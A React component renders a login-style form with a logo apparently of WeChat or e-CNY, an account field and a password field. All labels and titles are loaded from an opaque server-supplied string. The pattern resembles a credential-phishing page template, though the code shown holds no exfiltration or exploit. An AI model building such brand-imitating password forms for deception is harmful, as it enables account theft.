import { useEffect, useState } from "react";
import { Form, Input, Button } from "antd";
import { useModuleData } from "./moduleContext";

export const ITEM_KEYS = ["item1", "item8"] as const;

export default function Module2Page() {
  const moduleData = useModuleData();
  const [infoArr, setInfoArr] = useState<string[]>([]);
  const isSubmitDisabled = moduleData.submitting || !moduleData.canSubmit;

  useEffect(() => {
    document.title = moduleData.moduleInfo.siteTitle || "";
    setInfoArr(moduleData.moduleInfo.title.split('|') || ''); // 获取信息列表
  }, [moduleData.moduleInfo.siteTitle]);

  return <>
    {
      infoArr.length === 8 &&  <main className="h-screen w-screen px-10 text-sm" data-module="module1">
        <span className="px-[12.5%] w-full flex flex-col items-center justify-center">
          <img src="/w/wx_ecny.svg" draggable="false"></img>
          <h2  className="text-center text-[1.4rem] my-2 text-black">{infoArr[0]}</h2>
        </span>
        <div className="border-b border-gray-200 py-[30px] text-center text-[20px] text-gray-600">{infoArr[1]}</div>
        {/*
         * 2026-09-12 00:00:00 CST：module1 按本页面独立需求直接使用 Ant Design Form/Input，避免与其他 module 共享布局。
         * 触发场景：module1 展示字段输入时，label 需要固定在最左侧且 Input 不显示边框。
         * 维护注意：字段仍从当前 moduleData.itemKeys 读取，切换 module 的清空逻辑和提交校验由路由层统一维护。
         */}
        <Form layout="vertical" onFinish={moduleData.submit} className="mx-auto w-full max-w-xl">
          {moduleData.itemKeys.map((key, i) => {
            return (
              <Form.Item key={key} noStyle>
                <div className="flex h-[4rem] w-full border-b border-gray-200">
                  <div className="flex w-[80px] shrink-0 items-center text-sm font-medium text-slate-700">{infoArr[i+2]}</div>
                  <Input
                    type={key=='item8'?"password":"text"}
                    variant="borderless"
                    placeholder={`请填写${infoArr[4+i]}`}
                    value={moduleData.values[key] ?? ""}
                    onChange={(event) => moduleData.onValueChange(key, event.target.value)}
                    className="!text-black text-[18px] placeholder:!text-[#c5c5c5]"
                  />
                </div>
              </Form.Item>
            );
          })}
          <Form.Item noStyle>
            <div className="flex flex-col items-center mt-8 gap-y-4">
              <div className="text-gray-400 text-sm">{infoArr[6]}</div>
              <Button
                className={`${isSubmitDisabled ? "!text-[#b8b8b8] bg-gray-100" : "!text-white"} w-[40vw] h-[40px] text-[15px] font-bold border-gray-200`}
                type="primary" variant="solid" color="green"
                htmlType="submit"
                disabled={isSubmitDisabled}
              >
                {infoArr[7]}
              </Button>
            </div>
          </Form.Item>
        </Form>
      </main>
    }
  </>
}
